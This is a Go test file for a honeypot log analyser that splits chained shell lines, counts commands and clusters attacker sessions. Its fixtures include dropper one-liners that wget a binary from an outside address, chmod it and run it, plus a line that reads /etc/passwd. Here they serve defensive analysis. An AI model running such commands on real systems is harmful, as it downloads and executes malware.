package analysis

import (
	"strings"
	"testing"
)

func TestSplitLine(t *testing.T) {
	cases := []struct {
		line string
		want []string
	}{
		{"uname -a", []string{"uname -a"}},
		{"cd /tmp; wget http://a/x; chmod +x x; ./x",
			[]string{"cd /tmp", "wget http://a/x", "chmod +x x", "./x"}},
		{"cd /tmp || cd /var/run", []string{"cd /tmp", "cd /var/run"}},
		{"true && echo ok", []string{"true", "echo ok"}},
		{"cat /etc/passwd | grep root | wc -l",
			[]string{"cat /etc/passwd", "grep root", "wc -l"}},
		{"", nil},
		{"   ", nil},
	}
	for _, c := range cases {
		got := splitLine(c.line)
		if strings.Join(got, "|") != strings.Join(c.want, "|") {
			t.Errorf("splitLine(%q) = %q, want %q", c.line, got, c.want)
		}
	}
}

func TestSplitLineRespectsQuoting(t *testing.T) {
	// A semicolon inside quotes is data, not a separator — this is why the
	// splitter reuses the real shell parser instead of strings.Split.
	got := splitLine(`echo "one; two"`)
	if len(got) != 1 {
		t.Fatalf("quoted semicolon split the line: %q", got)
	}
	got = splitLine(`echo 'a && b'`)
	if len(got) != 1 {
		t.Fatalf("quoted && split the line: %q", got)
	}
}

func TestSplitLineFallsBackOnMalformedInput(t *testing.T) {
	// An unterminated quote is a parse error; the line is still one command
	// as far as the report is concerned, never silently dropped.
	line := `echo "unterminated`
	got := splitLine(line)
	if len(got) != 1 || got[0] != line {
		t.Errorf("malformed line = %q, want the line unchanged", got)
	}
}

func TestChainedLineCountsAndClusters(t *testing.T) {
	// The exact shape the honeypot records for `ssh host 'a; b; c'`.
	c := Command{Line: "cd /tmp; wget http://198.51.100.9/x86; chmod +x x86; ./x86"}
	if n := len(c.Parts()); n != 4 {
		t.Errorf("parts = %d, want 4", n)
	}
	if names := strings.Join(c.Names(), " "); names != "cd wget chmod ./payload" {
		t.Errorf("names = %q", names)
	}

	s := &Session{Commands: []Command{c}}
	if s.CommandCount() != 4 {
		t.Errorf("CommandCount = %d, want 4 (one recorded line, four commands)", s.CommandCount())
	}
	// Two droppers recorded as single chained lines still cluster together.
	other := &Session{Commands: []Command{{Line: "cd /tmp; wget http://203.0.113.1/arm7; chmod +x arm7; /tmp/arm7"}}}
	if s.Fingerprint() != other.Fingerprint() {
		t.Errorf("chained droppers did not cluster:\n  %q\n  %q", s.Fingerprint(), other.Fingerprint())
	}
}

func TestProbeDetectionUsesRealCommandCount(t *testing.T) {
	base := mkSession("198.51.100.1", nowForTest(), 2, "root", "x")
	// One recorded line, four commands, two seconds: a dropper, not a probe.
	base.Commands = []Command{{Line: "cd /tmp; wget http://a/x; chmod +x x; ./x"}}
	st := Summarise([]*Session{base})
	if st.Probes != 0 {
		t.Errorf("a four-command dropper must not count as a probe (got %d)", st.Probes)
	}
	if st.TotalCommands != 4 {
		t.Errorf("TotalCommands = %d, want 4", st.TotalCommands)
	}
}
